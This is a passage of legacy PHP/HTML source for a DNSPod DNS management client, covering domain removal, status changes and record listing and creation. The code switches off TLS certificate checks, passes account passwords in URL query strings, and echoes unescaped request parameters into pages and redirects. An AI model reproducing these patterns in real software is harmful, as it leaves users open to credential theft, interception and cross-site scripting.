<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名添加失败！原因：<?php echo $dnspoddomaincreate['message']." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
</table>                        
                        <?php       
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";                
                        }
                }       
                else{ 
                        AlertBack ("域名格式错误！" , 2);
                }
                break;
        case "Domain.Remove": // action - main start
                if (trim(request("delok")) == "1"){
                }
                else{
                	if(is_wap()){
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>确认</a>
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;
									}
									else{
				?>

        <script language="vbscript">
        <!--
                Dim delok
                delok = MsgBox("是否删除该相册！", vbOKCancel, "X3193")
                If delok = vbOK Or delok = vbYes Then
                        window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1"
                else    
                        MsgBox("该相册删除取消！")
                        window.location.href="<?php echo trim(request("refer"))?>"
                End If
        //-->
        </script>
                <?php 
                        break;
                     }

                }
                if (trim(request("domain_id")) == "" && count($_POST) == 0){
                        AlertBack ("未选择任何域名！" , 2);
                        break;
                }
                $dnspod = new dnspod_class();
                $dnspoddomainremove = $dnspod->dnspoddomainremove($dnspoduname,$dnspodpwd,trim(request('domain_id')),trim(request('type')),$_POST,$page,$pagesize);

                if ($dnspoddomainremove['code'] == "1"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名删除成功！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php 
                }
                elseif ($xmlstr != "" && $xmlstr != "wait"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名删除失败！原因： <?php echo $dnspoddomainremove['message'];?><?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                                
                ?>
</table>                        
                <?php       
                }
                else{
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名删除失败！原因：“未选择任何条目！”<?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                                
                ?>
</table>                        
                <?php       
                }
                break;  // action - Domain.Create start
        case "Domain.Status": // action - Domain.Status start
                if (trim(request("domain_id")) != ""){
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Domain status changed success.</message>'.
                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                '</status>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Domain.Status";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_id' => trim(request("domain_id")),
                                        'status' => trim(request("status")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                }
                elseif (trim(request("domain_id")) == "" && count($_POST) > 0){
                        //print_r($_POST);
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $totalrecord = '220';
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get domain list success</message>'.
                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                '</status>'.
                                                '<info>'.
                                                '<domain_total>'.$totalrecord.'</domain_total>'.
                                                '</info>'.
                                                '<domains>';
                                if (ceil($totalrecord/$pagesize) > $page){
                                        $strpagesize = $pagesize;
                                }       
                                elseif (ceil($totalrecord/$pagesize) == $page){
                                        $strpagesize = fmod($totalrecord,$pagesize);
                                }       
                                for($i=1;$i<=$strpagesize;$i++){
                                        $xmlstr = $xmlstr.
                                                        '<item>'.
                                                        '<id>141842</id>'.
                                                        '<name>dnspoo.com</name>'.
                                                        '<grade>D_Free</grade>'.
                                                        '<status>enable</status>'.
                                                        '<records>0</records>'.
                                                        '<shared_from>dnspod@dnspod.com</shared_from>'.
                                                        '</item>';              
                                }
                                $xmlstr = $xmlstr.
                                                '</domains>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Domain.List";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'format' => 'xml',
                                        'type' => trim(request('type'))==''?'mine':trim(request('type')),
                                        'offset' => $pagesize*($page-1),
                                        'length' => $pagesize
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                        $type = trim(request('type'))==''?'mine':trim(request('type'));
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);      
                        $objList = $objXml->getElementsByTagName("item");                       
                        //echo $objList->item(0)->getElementsByTagName("id")->item(0)->nodeValue;
                        if ($objList->length == $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;

                        $totalitem = $objXml->getElementsByTagName("domain_total")->item(0)->nodeValue;
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }

                        $xmlstr = "";
                        for($i = 0;$i <= $strpagesize-1;$i++){
                                $objHdd = $objList->item($i);
                                if ($_POST["chidd".$i] != ""){
                                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                                '<dnspod>'.
                                                                '<status>'.
                                                                '<code>1</code>'.
                                                                '<message>Domain status changed success.</message>'.
                                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                                '</status>'.
                                                                '</dnspod>';
                                        }       
                                        else{   
                                                $ch = curl_init();
                                                $url = "https://dnsapi.cn/Domain.Status";
                                                $data = array(
                                                        'login_email' => $dnspoduname,
                                                        'login_password' => $dnspodpwd,
                                                        'domain_id' => $objHdd->getElementsByTagName("id")->item(0)->nodeValue,
                                                        'status' => trim(request("status")),
                                                        'format' => 'xml'
                                                );                                              
                                                $ch = curl_init();
                                                curl_setopt($ch, CURLOPT_URL, $url);
                                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                                curl_setopt($ch, CURLOPT_POST, 1);
                                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                                $xmlstr = curl_exec($ch);
                                                curl_close($ch);
                                        }
                                }       
                                if ($xmlstr == ""){
                                }
                                else{
                                        $objXml = new DOMDocument();  
                                        $objXml->preserveWhiteSpace = true;
                                        $objXml->async = false; 
                                        $objXml->loadXML($xmlstr);                              
                                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == false || $objXml->getElementsByTagName("code")->item(0)->nodeValue != "1")
                                                break;
                                }       
                        }                               
                }
                elseif (trim(request("domain_id")) == "" && count($_POST) == 0){
                        AlertBack ("未选择任何域名！" , 1);
                        break;
                }

                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);                              

                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == "1"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名<?php  if (trim(request("status")) == "enable"){ ?>启动<?php  }else{ ?>停止<?php }?>成功！<?php echo ($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }
                else{
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名<?php  if (trim(request("status")) == "enable"){ ?>启动<?php  }else{ ?>停止<?php }?>失败！, 原因: <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?><?php echo " <br>".$timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php       
                }
                break;   // action - Domain.Status end
        case "Record.List": // action - Record.List start
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        $totalrecord = '220';
                        $xmlstr = '<?php xml version="1.0" encoding="utf-8"?>'.
                                        '<dnspod>'.
                                        '<status>'.
                                        '<code>1</code>'.
                                        '<message>Get record list success</message>'.
                                        '<created_at>2008-11-26 16:12:00</created_at>'.
                                        '</status>'.
                                        '<info>'.
                                        '<record_total>'.$totalrecord.'</record_total>'.
                                        '</info>'.
                                        '<records>';
                        if (ceil($totalrecord/$pagesize) > $page){
                                $strpagesize = $pagesize;
                        }       
                        elseif (ceil($totalrecord/$pagesize) == $page){
                                $strpagesize = fmod($totalrecord,$pagesize);
                        }       
                        for($i=1;$i<=$strpagesize;$i++){
                                $xmlstr = $xmlstr.
                                        '<item>'.
                                        '<id>5246120</id>'.
                                        '<name>@</name>'.
                                        '<line><![CDATA[默认]]></line>'.
                                        '<type>A</type>'.
                                        '<ttl>600</ttl>'.
                                        '<value>1.1.1.1</value>'.
                                        '<mx>0</mx>'.
                                        '<enabled>1</enabled>'.
                                        '<updated_on>2010-10-07 14:14:20</updated_on>'.
                                        '</item>';
                        }               
                        $xmlstr = $xmlstr.
                                        '</records>'.
                                        '</dnspod>';
                }       
                else{   
                        $ch = curl_init();
                        $url = "https://dnsapi.cn/Record.List";
                        $data = array(
                                'login_email' => $dnspoduname,
                                'login_password' => $dnspodpwd,
                                'domain_id' => trim(request("domainid")),
                                'offset' => $pagesize*($page-1),
                                'length' => $pagesize,
                                'format' => 'xml'
                        );
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);
                }       
                while(strpos($xmlstr, '<![CDATA[')){
                        $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                }
                if (strpos($xmlstr, '<?php xml version="1.0" encoding="utf-8"')==0){
                        $xmlstr = preg_replace("/(.*)(\<\?xml version=\"1.0\" encoding=\"utf-8\"\?\>)(.*)/", "\$1"."<?php xml version=\"1.0\" encoding=\"gb2312\"?>"."\$3", $xmlstr);
                }
                //echo $xmlstr;
                //return;

                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);

                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == '1'){
                }       
                else{
                        AlertBack ($objXml->getElementsByTagName("message")->item(0)->nodeValue , 1);           
                }

                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue !== true){
                }
                elseif ($objXml->getElementsByTagName("code")->item(0)->nodeValue != "1"){
                        AlertBack ($objXml->getElementsByTagName("message")->item(0)->nodeValue , 1);   
                }       

                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                // 加Xml 文件    
                $objXml->loadXML($xmlstr);
                $objList = $objXml->getElementsByTagName("item");               
                //echo $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;
                //echo $objList->length;
                if ($objList->length == $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                //echo $strpagesize;
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.dnspod.chidd'+i))
 {
  eval('document.dnspod.chidd'+i).checked = document.dnspod.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的子域名吗?')) return;
 document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Record.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>&delok=1';
 document.dnspod.submit();
}
function doitem(act)
{
 if(!confirm('确定更改选中的子域名状态吗?')) return;
 document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>&status=' + act;
 document.dnspod.submit();
}
</script>       
                <?php 
                $totalitem = $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $totalitem;?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo $dnspoduname;?> ] >> <?php  echo trim(request("topdomain"))?>  </td>
        </tr>
</table>        
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="dnspod" method="post" action="">
                <?php 
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=17%>
                        记录值
                </td>
                <td align="center" width=10%>
                        线路
                </td>
                <td align="center" width=10%>
                        类型
                </td>
                <td align="center" width=5%>
                        MX
                </td>
                <td align="center" width=10%>
                        TTL
                </td>
                <td align="center" width=23%>
                        记录值
                </td>
                <td align="center" width=30%>
                        <a style="color:#000000" href="<?php  echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Record.Create");?>&skin=<?php echo $skincolor?>&uname=<?php echo encodeuri(trim(request("uname")))?>&pwd=<?php echo encodeuri(trim(request("pwd")))?>&domainid=<?php echo trim(request("domainid"))?>&topdomain=<?php echo encodeuri(trim(request("topdomain")))?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page."&grade=".encodeuri(trim(request("grade")))?>">添加</a> 搜索 <a style="color:#000000" href="javascript:delitem();">删除</a> <a style="color:#000000" href="javascript:doitem('enable');">启</a>/<a style="color:#000000" href="javascript:doitem('disable');">停</a>
                </td> 
        </tr>   
                <?php 
                for($i = 0;$i <= $strpagesize-1;$i++){
                        $objHdd = $objList->item($i);
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                        $recordid = $objHdd->getElementsByTagName('id')->item(0)->nodeValue;
                        $recordname = $objHdd->getElementsByTagName('name')->item(0)->nodeValue;
                        $recordtype = $objHdd->getElementsByTagName('type')->item(0)->nodeValue;
                        $recordline = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('line')->item(0)->nodeValue);
                        $recordttl = $objHdd->getElementsByTagName('ttl')->item(0)->nodeValue;
                        $recordvalue = $objHdd->getElementsByTagName('value')->item(0)->nodeValue;
                        $recordmx = $objHdd->getElementsByTagName('mx')->item(0)->nodeValue;
                        $recordenabled = $objHdd->getElementsByTagName('enabled')->item(0)->nodeValue;
                        $recordtime = $objHdd->getElementsByTagName('updated_on')->item(0)->nodeValue;

                        if (preg_match("/[^@]/i", $recordname) && preg_match("/(?:CNAME|NS|A)/i", $recordtype) && $recordenabled == 1)
                                echo "<a style='color:#000000' href='http://".$recordname.".".trim(request("topdomain"))."' target='_blank'>".$recordname."</a>";
                        elseif (preg_match("/[@]/i", $recordname) && preg_match("/(?:CNAME|NS|A)/i", $recordtype) && $recordenabled == 1)       
                                echo "<a style='color:#000000' href='http://".trim(request("topdomain"))."' target='_blank'>".$recordname."</a>";
                        else
                                echo " ".$recordname." ";
                ?>
                </td>
                <td align="center">
                        <?php echo $recordline?>
                </td>
                <td align="center">
                        <?php echo $recordtype?>
                </td>
                <td align="center">
                        <?php echo $recordmx?>
                </td>
                <td align="center">
                        <?php echo $recordttl?>
                </td>
                <td align="center">
                        <?php echo $recordvalue?>
                </td>
                <td align="center"><a href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Modify")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".encodeuri(trim(request("domainid")))."&record_id=".$recordid."&sub_domain=".encodeuri($recordname)."&record_type=".$recordtype."&record_line=".$recordline."&value=".encodeuri($recordvalue)."&mx=".$recordmx."&ttl=".$recordttl."&edit=1&topdomain=".encodeuri(trim(request("topdomain")))."&grade=".encodeuri(trim(request("grade")));?>" style="color:#000000">修改</a> <a style="color:#000000" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>">删除</a> <?php  if ($recordenabled == "1"){?><a style="color:#000000" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&status=disable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>">停用</a><?php }else{?><a style="color:#000000" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&status=enable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">启用</a><?php }?> 监控</td>
        </tr>   
                <?php 
                }
                ?>
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>下一页</a> ";
                				
                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 

                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                break;   // action - Record.List end    
        case "Record.Create": // action - Record.Create start
                if (trim(request("record_type")) == "" || trim(request("record_line")) == "" || trim(request("value")) == ""){
?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo $dnspoduname;?> ] >> <?php  echo "<a style='color:#000000' href='".ScriptPath()."?api=dnspod&action=".encodeuri("Record.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>".trim(request("topdomain"))."</a>";?>  </td>
        </tr>
</table>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="50">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=dnspod&domainid=<?php echo trim(request("domainid"))?>&action=<?php echo encodeuri("Record.Create");?>&pagesize=<?php echo encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&topdomain=".encodeuri(trim(request("topdomain")))."&skin=".$skincolor?>" method="post" name="dnspod">
                        &nbsp记录名：<input type="text" class="text" name="sub_domain" value="" style="height:20px;width:15%;font-size:11px;" <?php  $style->textarea("#FCFC9D","") ?>>  
                        <SELECT name="record_type" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:10%;height:16px;font-size:12px">
                        <?php 
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get record type success.</message>'.
                                                '<created_at>2010-10-07 14:52:43</created_at>'.
                                                '</status>'.
                                                '<types>'.
                                                '<item>A</item>'.
                                                '<item>CNAME</item>'.
                                                '<item>MX</item>'.
                                                '<item>TXT</item>'.
                                                '<item>URL</item>'.
                                                '<item>NS</item>'.
                                                '<item>AAAA</item>'.
                                                '</types>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Type";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_grade' => trim(request("grade")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }       

                        while(strpos($xmlstr, '<![CDATA[')){
                                $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                        }
                                                
                        //echo $xmlstr;
                        //return;
                        
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        $objList = $objXml->getElementsByTagName("item");               
                        $record_type = "";
                        for($i=0;$i<$objList->length;$i++){
                                if ($i=='0'){
                                        $record_type = $record_type.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                                else{
                                        $record_type = $record_type.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                        }
                        //echo $record_type;
                        //return;
